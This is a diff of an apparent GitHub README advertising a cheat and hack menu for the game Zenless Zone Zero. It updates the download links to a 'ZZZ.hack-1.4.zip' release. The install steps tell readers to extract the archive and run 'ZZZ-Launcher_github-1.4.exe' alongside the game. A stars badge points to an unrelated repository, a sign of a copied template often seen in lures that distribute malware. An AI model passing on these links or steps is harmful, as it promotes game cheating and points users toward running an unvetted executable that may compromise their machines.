@@ -1,7 +1,7 @@
 # Zenless Zone Zero Cheats & Hacks Menu (UPD: 14-Sep-2026)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/stargazers)
 
@@ -26,7 +26,7 @@ _A powerful hacks tool for Zenless Zone Zero with clean in-game overlay_
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\zzz-hacks` or Desktop).
 3. Launch game.
 4. Run `ZZZ-Launcher_github-1.4.exe`.
